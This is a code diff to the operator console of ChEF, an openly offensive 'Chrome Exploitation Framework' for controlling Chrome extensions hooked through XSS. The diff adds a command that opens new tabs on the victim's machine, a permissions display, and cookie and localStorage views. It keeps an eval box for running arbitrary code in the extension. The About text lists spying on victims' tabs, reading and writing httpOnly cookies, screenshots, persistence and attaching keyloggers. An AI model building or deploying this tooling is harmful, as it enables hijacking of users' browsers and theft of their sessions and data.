@@ -2,6 +2,7 @@
 <head>
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
 <script src="bootstrap/js/bootstrap.min.js"></script>
+<title>XSS ChEF console</title>
 <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css"/>
 <link href="bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
 <style>
@@ -61,7 +62,7 @@ display:none;
             <div class="tabbable">
                 <ul class="nav nav-tabs">
                     <li class="active"><a href="#tab-tabs" class='active' data-toggle="tab">Tabs</a></li>
-                    <li><a href="#tab-ext-info" data-toggle="tab">Extension info</a></li>
+                    <li><a href="#tab-ext-info" data-toggle="tab">Hooked extension info</a></li>
                     <li><a href="#tab-ext-commands" data-toggle="tab">Commands</a></li>
                     <li><button id=refresh-hook class='btn btn-secondary'><i class="icon-refresh"></i> Refresh hook</button> </li>                    
                 </ul>
@@ -125,10 +126,10 @@ display:none;
                                                 <th>URL</th><td data-fld=url></td>
                                                 </tr>
                                                 <tr>
-                                                <th>Cookies</th><td data-fld=cookies></td>
+                                                <th>Cookies</th><td class=mono data-fld=cookies></td>
                                                 </tr>
                                                 <tr>
-                                                <th>localStorage</th><td><textarea style="width: 100%; height: 200px" data-fld=localStorage></textarea></td>
+                                                <th>localStorage</th><td><textarea class=mono style="width: 100%; height: 200px" data-fld=localStorage></textarea></td>
                                                 </tr>
                                                 </tbody>
                                                 </table>
@@ -145,10 +146,14 @@ display:none;
                         <th>URL</th><td data-fld=extension></td>
                         </tr>
                         <tr>
-                        <th>Cookies</th><td data-fld=cookies></td>
+                        <th>Permissions</th><td class=mono data-fld=permissions></td>
+                        </tr>
+
+                        <tr>
+                        <th>Cookies</th><td class=mono data-fld=cookies></td>
                         </tr>
                         <tr>
-                        <th>localStorage</th><td><textarea style="width: 100%; height: 200px" data-fld=localStorage></textarea></td>
+                        <th>localStorage</th><td><textarea class=mono style="width: 100%; height: 200px" data-fld=localStorage></textarea></td>
                         </tr>
                         <tr>
                         <th>HTML</th><td><textarea style="width: 100%; height:200px" data-fld=html></textarea></td>
@@ -165,6 +170,10 @@ display:none;
             <li><button id=ping class='btn btn-secondary'>Ping</button></li>
             <li><button id=do-screenshot class='btn btn-secondary'><i class="icon-picture"></i> Screenshot</button></li>
             </ul>
+                        <div class=control-group>
+
+            <label>Create new tab</label>
+            <input id="tab-create-url" style="padding:0"/>
                             <form action="#">
                                 <label>Eval</label>
                                 <textarea name=eval-ext class="mono span8" placeholder="alert(/place code to eval in extension/)"></textarea>
@@ -208,11 +217,12 @@ display:none;
       <p>v.0.1</p>
       <h4>About</h4>
       <p>This is a Chrome Exploitation Framework - think <a href="http://www.bindshell.net/tools/beef.html">BeEF</a> for Chrome extensions.
-      Whenever you encounter a XSS vulnerability in Chrome extension, ChEF will demonstrate what is possible. And what is possible (provided the extension had appropriate permissions)?
+      Whenever you encounter a XSS vulnerability in Chrome extension, ChEF will ease the exploitation.
+      <p>What can you do when having appropriate permissions?</p>
       <ul>
       <li>Monitoring open tabs of victims</li>
       <li>JS execution (XSS) on every tab</li>
-      <li>HTML extraction, reading cookies, localStorage</li>
+      <li>HTML extraction, reading/writing cookies (also httpOnly), localStorage</li>
       <li>Persistence until browser is closed (or even futher if you can persist in extensions' localStorage)</li>
       <li>Screenshot of your windows</li>
       <li>Further exploitation e.g. via attaching BeEF hooks, keyloggers etc.</li>
@@ -274,7 +284,6 @@ var hookStorage = {
     updateTab: function(hook, id, data) {
         var tab = this.getTab(hook, id);
         tab = $.extend(tab, data);
-        console.log(data);
         this.setTab(hook, id, tab);
     },
     
@@ -395,6 +404,7 @@ function processResponse(r, hook) {
         case 'report_tabs':
             hookStorage.setTabs(hook, r.result);
             refreshTabsTable(hookStorage.getTabs(hook));
+            al('New tab list received');
         break;
         case 'report_ext':
             hookStorage.store(hook, 'info', r.result);
@@ -443,6 +453,11 @@ $(function() {
         refreshTabsTable([]);
         sendCmd('report');
     });
+
+    $("#tab-create-url").click(function() {
+        sendCmd('createtab', this.value);
+    });
+    
     
     $("#fix-server").click(function() {
         $.get('server.php?delete=1&ch=' + encodeURIComponent(hook));
